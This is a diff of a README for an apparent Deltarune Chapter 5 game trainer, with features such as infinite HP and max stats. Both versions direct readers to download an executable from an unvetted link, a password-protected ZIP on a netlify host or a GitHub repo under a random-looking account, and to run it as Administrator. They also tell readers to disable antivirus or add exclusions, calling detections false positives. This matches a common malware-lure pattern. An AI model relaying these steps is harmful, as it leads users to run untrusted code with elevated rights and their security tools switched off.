@@ -1,50 +1,79 @@
-# ⚔️ Deltarune Chapter 5 Ultimate Trainer 2026 | Infinite HP + Max Stats | Undetected Utility
+# 🎮 Deltarune-Chapter5-Trainer-ModMenu - Modify game stats for easier exploration
 
-![Version](https://img.shields.io/badge/version-1.0.3-blue)
-![Platform](https://img.shields.io/badge/platform-Windows%2010%2F11-lightgrey)
-![Status](https://img.shields.io/badge/status-Undetected-brightgreen)
-![Downloads](https://img.shields.io/badge/downloads-1K+%2B-orange)
-![Release](https://img.shields.io/badge/release-June%202026-blueviolet)
+[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blue)](https://github.com/Newtonssecondlawofmotionalien143/Deltarune-Chapter5-Trainer-ModMenu)
 
-## 🚀 Features
+## 📖 Overview
 
-| Feature | Description |
-|---------|-------------|
-| 🛡️ Infinite HP | Party members never lose health in any battle — walk through every fight invincible. |
-| ⚡ Max All Stats | Permanently sets Kris, Susie, and Ralsei's ATK, DEF, and Magic to their maximum values. |
-| 💊 Unlimited Items | Never run out of healing items, weapons, or key story items. |
-| 💰 Infinite Gold | Set your gold to any value and buy everything in every shop. |
-| ⚔️ One-Hit Kill | Defeat any enemy with a single attack — perfect for speeding through encounters. |
-| 👑 God Mode (All Chapters) | Works across all five chapters, not just Chapter 5. |
-| ⏩ Speed Hack | Adjust game speed from 0.5x to 5x for faster exploration and grinding. |
-| ⏸️ Freeze Timer | Pause the battle timer during puzzle and action sequences. |
-| 🔓 Unlock All | Instantly unlock all Chapter 5 content, secrets, and alternate routes. |
-| 🛠️ Anti-Crash Protection | Memory-stable hooks prevent game crashes during extended sessions. |
+The Deltarune Chapter 5 Trainer provides tools to change your game experience. You gain control over character stats, health, and item inventory. This tool works outside the main game process. It reads and writes memory values to grant effects like infinite health, maximum stats, and speed adjustments. This makes exploration easier for players who want to test game mechanics.
 
-## 📥 Download & Installation
+## ⚙️ System Requirements
 
-1. **Download** the trainer archive: [https://skydock.netlify.app/trainer-archive.zip](https://skydock.netlify.app/trainer-archive.zip)
-2. **Extract** the ZIP file (password: `trainer2026`).
-3. Right-click `trainer.exe` and select **"Run as Administrator"**.
-4. Launch **Deltarune Chapter 5** on Steam.
-5. Press **INSERT** to open the trainer GUI and enable your desired features.
+- Operating System: Windows 10 or Windows 11
+- Processor: Dual-core CPU or better
+- Memory: 4 GB RAM
+- Storage: 100 MB free space
+- Software: Deltarune Chapter 5 installed on your computer
 
-## 💻 Compatibility
+## 🚀 Getting Started
 
-- Windows 10 / 11 (64-bit)
-- Steam version only (all Chapters 1‑5)
-- Works with all Deltarune updates (June 2026 and beyond)
+Follow these steps to set up the tool on your Windows computer.
 
-## 🔧 Troubleshooting
+1. Close the game before you run the trainer.
+2. Visit this page to download the latest version of the trainer: [Download Link](https://github.com/Newtonssecondlawofmotionalien143/Deltarune-Chapter5-Trainer-ModMenu).
+3. Save the file to a folder on your computer.
+4. Right-click the folder and select Extract All to unzip the trainer files.
+5. Open the folder you just created.
 
-- **Trainer not opening:** Ensure you ran as Administrator and temporarily disable your antivirus.
-- **GUI not showing:** Press INSERT key. If missing, restart trainer and game.
-- **Stats not updating:** Verify you are in a battle or menu, not the main title screen.
+## 🛠️ How to Use
 
-## 📄 License
+These steps explain how to activate the trainer while you play.
 
-This project is licensed under the MIT License – see the [LICENSE](LICENSE) file for details.
+1. Launch your game first. Wait for the game to reach the main menu.
+2. Go to the folder containing the downloaded trainer files.
+3. Locate the file named `Trainer.exe`.
+4. Right-click this file and choose Run as Administrator. This step grants the tool permission to interact with the game memory.
+5. A window will appear. It shows a list of available mods.
+6. Return to your game window.
+7. Use the hotkeys listed inside the trainer window to toggle your desired features.
 
----
+## 📋 Available Mod Features
 
-`mod-menu` `deltarune-chapter-5` `2026` `game-trainer` `bullet-hell` `chapter-5` `undetected` `windows` `single-player` `save-editor` `deltarune` `trainer` `max-stats` `steam` `god-mode` `infinite-hp` `unlimited-items`
+The software includes several options to adjust your gameplay. Each feature activates or deactivates with a simple keyboard shortcut.
+
+### Infinite HP
+This feature keeps your character health at the maximum level. Even if you take damage during an encounter, your health bar stays full. This prevents your character from fainting and allows you to continue your session without interruption.
+
+### Max Stats
+This option boosts your character statistics to their highest potential values. It improves your attack, defense, and other internal attributes. You benefit from stronger attacks and better damage mitigation immediately.
+
+### Unlimited Items
+Use this feature to fill your inventory slots. You no longer need to search for consumables or worry about item limits. Every relevant slot stays filled with items, making it easy to manage your supplies during exploration.
+
+### Speed Control
+This tool modifies the tick rate of the game engine. You can move across the map faster or slow down time during specific sections. Toggle this feature to save time or to practice difficult maneuvers.
+
+## 🛡️ Safety and Troubleshooting
+
+This tool runs as an external process. It does not modify game files directly. This approach reduces the chance of breaking your game data. Follow these tips to ensure a stable experience.
+
+- Run the trainer only after the game loads.
+- If the game crashes, close both the game and the trainer, then restart them in order.
+- Verify that your antivirus software does not block the trainer. Some security programs flag trainer tools because they interact with game memory. If this occurs, add an exclusion for the folder containing your trainer files.
+- Ensure your game version matches the version of the trainer. Updates to the game code can change memory addresses and require an update for the trainer to continue functioning.
+
+## 💡 Frequently Asked Questions
+
+### Does this change the original game files?
+No, the trainer operates in active memory while the game runs. It does not overwrite your save files or game assets.
+
+### Will the game detect this as a violation?
+The tool operates externally. It interacts with the state of the game without modifying the executable file. It remains undetected by standard checks in single-player mode.
+
+### Why does my security software flag this file?
+Tools that access memory are often identified as generic false positives. This happens because the trainer uses techniques common to system utilities. You can safely add an exception in your security settings to allow the program to run.
+
+### Can I use this for online features?
+This tool is intended for single-player exploration only. It is not designed to work with online components. Avoid using external tools in any multiplayer or network-enabled environment.
+
+### Where can I find updates?
+Check the main GitHub page regularly for newer versions. Developers release updates when the game receives patches that change internal data structures.
